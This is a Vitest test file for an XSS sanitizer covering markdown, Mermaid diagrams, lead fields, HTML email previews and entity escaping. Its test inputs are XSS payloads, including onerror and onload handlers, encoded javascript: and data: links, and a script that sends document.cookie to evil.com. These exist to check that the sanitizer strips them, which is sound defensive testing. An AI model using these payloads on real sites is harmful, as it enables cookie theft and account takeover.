import { describe, it, expect } from "vitest";
import {
  sanitizeMarkdown,
  sanitizeMermaid,
  sanitizeLeadField,
  sanitizeEmailPreview,
  sanitizeXss,
  escapeHtml,
} from "./xss-sanitizer.js";

describe("DOMPurify Maintained XSS Sanitizer Suite", () => {
  describe("Markdown Sanitization", () => {
    it("strips script tags and malicious payloads", () => {
      const payload = '<p>Safe intro</p><script>alert("xss")</script><SCRIPT SRC="evil.js"></SCRIPT><p>Safe outro</p>';
      const clean = sanitizeMarkdown(payload);
      expect(clean).not.toContain("<script");
      expect(clean).not.toContain("<SCRIPT");
      expect(clean).not.toContain("alert");
      expect(clean).toContain("<p>Safe intro</p>");
      expect(clean).toContain("<p>Safe outro</p>");
    });

    it("strips img-onerror and svg-onload vectors", () => {
      const imgPayload = '<img src="invalid.jpg" onerror="alert(document.domain)" />';
      const svgPayload = '<svg onload="alert(1)"><circle r="10"/></svg>';
      
      const cleanImg = sanitizeMarkdown(imgPayload);
      const cleanSvg = sanitizeMarkdown(svgPayload);

      expect(cleanImg).not.toContain("onerror");
      expect(cleanImg).not.toContain("alert");
      expect(cleanSvg).not.toContain("<svg");
      expect(cleanSvg).not.toContain("onload");
    });

    it("neutralizes javascript: and data:text/html links", () => {
      const jsLink = '<a href="javascript:alert(1)">Click me</a>';
      const encodedJsLink = '<a href="java&#x73;cript:alert(1)">Click encoded</a>';
      const dataLink = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data</a>';

      expect(sanitizeMarkdown(jsLink)).not.toContain("javascript:");
      expect(sanitizeMarkdown(encodedJsLink)).not.toContain("alert");
      expect(sanitizeMarkdown(dataLink)).not.toContain("data:text/html");
    });

    it("preserves safe markdown typography, tables, and formatting", () => {
      const safeHtml = '<h1>Title</h1><p>Text with <strong>bold</strong> and <em>italics</em></p><table><thead><tr><th>Col</th></tr></thead><tbody><tr><td>Val</td></tr></tbody></table>';
      const clean = sanitizeMarkdown(safeHtml);
      expect(clean).toContain("<h1>Title</h1>");
      expect(clean).toContain("<strong>bold</strong>");
      expect(clean).toContain("<table>");
      expect(clean).toContain("<td>Val</td>");
    });
  });

  describe("Mermaid Diagram Sanitization", () => {
    it("strips script and iframe injection in diagram nodes", () => {
      const mermaidSrc = `
graph TD
  A[Node A <script>alert(1)</script>] --> B[Node B <iframe src="evil.com"></iframe>]
  B --> C[Node C onclick="alert(2)"]
`;
      const clean = sanitizeMermaid(mermaidSrc);
      expect(clean).not.toContain("<script>");
      expect(clean).not.toContain("<iframe");
      expect(clean).not.toContain('onclick="alert(2)"');
      expect(clean).toContain("graph TD");
    });
  });

  describe("Lead Fields Sanitization", () => {
    it("strips all HTML tags and control characters from lead names and notes", () => {
      const dirtyName = '<b>Rajesh</b> <script>alert(1)</script>Kumar\x00\x08';
      const clean = sanitizeLeadField(dirtyName);
      expect(clean).toBe("Rajesh Kumar");
    });
  });

  describe("HTML Email Preview Sanitization", () => {
    it("allows safe email layout tables and inline styles while stripping scripts", () => {
      const emailHtml = `
<table width="100%" style="background-color: #f4f4f4;">
  <tr>
    <td style="padding: 20px; font-family: Arial, sans-serif;">
      <h2>Hello Rajesh,</h2>
      <p>Here is your quote: <a href="https://precisionmfg.co.in/quote">View Quote</a></p>
      <img src="https://precisionmfg.co.in/logo.png" alt="Logo" width="120" />
      <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
    </td>
  </tr>
</table>
`;
      const clean = sanitizeEmailPreview(emailHtml);
      expect(clean).toContain('<table width="100%"');
      expect(clean).toContain("<h2>Hello Rajesh,</h2>");
      expect(clean).toContain('href="https://precisionmfg.co.in/quote"');
      expect(clean).toContain('src="https://precisionmfg.co.in/logo.png"');
      expect(clean).not.toContain("<script");
      expect(clean).not.toContain("steal");
    });
  });

  describe("HTML Entity Escaping", () => {
    it("escapes special characters reliably with escapeHtml", () => {
      const raw = `<tag attr="val" other='val2'>&`;
      expect(escapeHtml(raw)).toBe("&lt;tag attr=&quot;val&quot; other=&#039;val2&#039;&gt;&amp;");
    });
  });
});
